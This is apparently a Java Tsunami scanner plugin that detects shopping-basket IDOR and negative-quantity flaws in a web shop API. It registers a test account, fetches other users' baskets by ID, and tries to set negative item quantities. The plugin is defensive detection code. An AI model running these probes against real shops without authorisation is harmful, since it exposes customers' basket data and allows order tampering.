/*
 * Copyright 2024 Lukas Pirch
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.raid;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static java.lang.String.format;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.inject.Inject;
import com.google.protobuf.util.Timestamps;
import com.google.protobuf.ByteString;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.net.http.HttpRequest;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import com.google.tsunami.common.net.http.HttpHeaders;

import java.io.IOException;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.time.Instant;
import java.time.Clock;
import java.util.regex.Pattern;
import java.util.regex.Matcher;

@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "BasketaccessmanipulationdetectorDetector",
    version = "0.1",
    description = "Detects BasketAccessManipulationDetector vulnerability.",
    author = "Joscha, Elena the Debug Dingos",
    bootstrapModule = BasketaccessmanipulationdetectorDetectorBootstrapModule.class)
public final class BasketaccessmanipulationdetectorDetector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  private final HttpClient httpClient;
  private final Clock utcClock;
  private String token = "";

  @Inject
  public BasketaccessmanipulationdetectorDetector(HttpClient httpClient, @UtcClock Clock utcClock) {
    this.httpClient = httpClient;
    this.utcClock = checkNotNull(utcClock);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("Starting detection for Basketaccessmanipulationdetector Detector");
    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    String targetUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
    int successfulAttacks = 0;
    
    try {
        // First, try to register and login to get a valid session
        String email = "test" + System.currentTimeMillis() + "@test.com";
        String password = "password123";
        String token = registerAndLogin(targetUri, email, password);
        
        if (token == null) {
            logger.atWarning().log("Failed to obtain authentication token");
            return false;
        }
        
        HttpHeaders authHeaders = HttpHeaders.builder()
            .addHeader("Authorization", "Bearer " + token)
            .addHeader("Content-Type", "application/json")
            .addHeader("Accept", "application/json")
            .build();
        
        // Test 1: Access basket with different bid values (IDOR)
        for (int bid = 1; bid <= 5; bid++) {
            try {
                HttpResponse basketResponse = httpClient.send(
                    HttpRequest.get(targetUri + "/rest/basket/" + bid)
                        .setHeaders(authHeaders)
                        .build(),
                    networkService);
                
                if (basketResponse.status().code() == 200) {
                    String responseBody = basketResponse.bodyBytes()
                        .map(bs -> bs.toStringUtf8())
                        .orElse("");
                    
                    // Check if we got basket data (indicates successful unauthorized access)
                    if (responseBody.contains("Products") || responseBody.contains("items") || 
                        responseBody.contains("BasketId") || responseBody.contains("quantity")) {
                        successfulAttacks++;
                        logger.atInfo().log("Successfully accessed basket with bid: " + bid);
                        break; // One successful IDOR is enough to confirm vulnerability
                    }
                }
            } catch (IOException e) {
                logger.atWarning().log("IDOR test failed for bid " + bid + ": " + e.getMessage());
            }
        }
        
        // Test 2: Try to manipulate basket item quantities with negative values
        // First, add an item to basket to get a basket item ID
        String basketItemId = addItemToBasket(targetUri, token, networkService);
        
        if (basketItemId != null) {
            // Test negative quantity manipulation
            String[] negativeQuantities = {"-100", "-999", "-1"};
            
            for (String quantity : negativeQuantities) {
                try {
                    String payload = "{\"quantity\": " + quantity + "}";
                    
                    HttpResponse manipulationResponse = httpClient.send(
                        HttpRequest.put(targetUri + "/api/BasketItems/" + basketItemId)
                            .setHeaders(authHeaders)
                            .setRequestBody(ByteString.copyFromUtf8(payload))
                            .build(),
                        networkService);
                    
                    if (manipulationResponse.status().code() == 200) {
                        // Verify the negative quantity was actually set
                        HttpResponse verifyResponse = httpClient.send(
                            HttpRequest.get(targetUri + "/rest/basket")
                                .setHeaders(authHeaders)
                                .build(),
                            networkService);
                        
                        if (verifyResponse.status().code() == 200) {
                            String verifyBody = verifyResponse.bodyBytes()
                                .map(bs -> bs.toStringUtf8())
                                .orElse("");
                            
                            // Check if negative quantity is reflected in response
                            if (verifyBody.contains("\"quantity\":" + quantity)) {
                                successfulAttacks++;
                                logger.atInfo().log("Successfully set negative quantity: " + quantity);
                                break; // One successful manipulation is enough
                            }
                        }
                    }
                } catch (IOException e) {
                    logger.atWarning().log("Quantity manipulation test failed for " + quantity + ": " + e.getMessage());
                }
            }
        }
        
        return successfulAttacks > 0;
        
    } catch (Exception e) {
        logger.atWarning().log("Basket access and manipulation test failed: " + e.getMessage());
        return false;
    }
}

private String registerAndLogin(String targetUri, String email, String password) {
    try {
        HttpHeaders headers = HttpHeaders.builder()
            .addHeader("Content-Type", "application/json")
            .addHeader("Accept", "application/json")
            .build();
        
        // Register user
        String registerPayload = "{\"email\":\"" + email + "\",\"password\":\"" + password + "\",\"passwordRepeat\":\"" + password + "\",\"securityQuestion\":{\"id\":1,\"question\":\"Your eldest siblings middle name?\",\"createdAt\":\"2024-01-01T00:00:00.000Z\",\"updatedAt\":\"2024-01-01T00:00:00.000Z\"},\"securityAnswer\":\"test\"}";
        
        HttpResponse registerResponse = httpClient.send(
            HttpRequest.post(targetUri + "/api/Users")
                .setHeaders(headers)
                .setRequestBody(ByteString.copyFromUtf8(registerPayload))
                .build());
        
        // Login to get token
        String loginPayload = "{\"email\":\"" + email + "\",\"password\":\"" + password + "\"}";
        
        HttpResponse loginResponse = httpClient.send(
            HttpRequest.post(targetUri + "/rest/user/login")
                .setHeaders(headers)
                .setRequestBody(ByteString.copyFromUtf8(loginPayload))
                .build());
        
        if (loginResponse.status().code() == 200) {
            String responseBody = loginResponse.bodyBytes()
                .map(bs -> bs.toStringUtf8())
                .orElse("");
            
            // Extract token from response
            Pattern tokenPattern = Pattern.compile("\"token\":\"([^\"]+)\"");
            Matcher matcher = tokenPattern.matcher(responseBody);
            if (matcher.find()) {
                return matcher.group(1);
            }
        }
        
        return null;
    } catch (IOException e) {
        logger.atWarning().log("Registration/login failed: " + e.getMessage());
        return null;
    }
}

private String addItemToBasket(String targetUri, String token, NetworkService networkService) {
    try {
        HttpHeaders headers = HttpHeaders.builder()
            .addHeader("Authorization", "Bearer " + token)
            .addHeader("Content-Type", "application/json")
            .addHeader("Accept", "application/json")
            .build();
        
        // Add a product to basket (assuming product ID 1 exists)
        String addPayload = "{\"ProductId\":1,\"BasketId\":\"1\",\"quantity\":1}";
        
        HttpResponse addResponse = httpClient.send(
            HttpRequest.post(targetUri + "/api/BasketItems")
                .setHeaders(headers)
                .setRequestBody(ByteString.copyFromUtf8(addPayload))
                .build(),
            networkService);
        
        if (addResponse.status().code() == 200) {
            String responseBody = addResponse.bodyBytes()
                .map(bs -> bs.toStringUtf8())
                .orElse("");
            
            // Extract basket item ID from response
            Pattern idPattern = Pattern.compile("\"id\":(\\d+)");
            Matcher matcher = idPattern.matcher(responseBody);
            if (matcher.find()) {
                return matcher.group(1);
            }
        }
        
        return null;
    } catch (IOException e) {
        logger.atWarning().log("Failed to add item to basket: " + e.getMessage());
        return null;
    }
}

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(
            Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("BASKETACCESSMANIPULATIONDETECTOR_VULNERABILITY"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("BasketAccessManipulationDetector Vulnerability Exposed")
                .setDescription("The application is vulnerable to BasketAccessManipulationDetector attacks.")
                .setRecommendation(
                    "Implement proper authorization checks to ensure users can only access their own baskets. Add server-side validation for basket item quantities to prevent negative values. Use secure session management and validate user permissions for all basket operations."))
        .build();
  }
  
  public ImmutableList<Vulnerability> getAdvisories() {
    return ImmutableList.of(
        Vulnerability.newBuilder()
            .setMainId(
                VulnerabilityId.newBuilder()
                    .setPublisher("TSUNAMI_COMMUNITY")
                    .setValue("BASKETACCESSMANIPULATIONDETECTOR_VULNERABILITY"))
            .setSeverity(Severity.CRITICAL)
            .setTitle("BasketAccessManipulationDetector Vulnerability Exposed")
            .setDescription(
                "The application is vulnerable to BasketAccessManipulationDetector attacks.")
            .setRecommendation(
                "Implement proper authorization checks to ensure users can only access their own baskets. Add server-side validation for basket item quantities to prevent negative values. Use secure session management and validate user permissions for all basket operations.")
        .build());
  }
}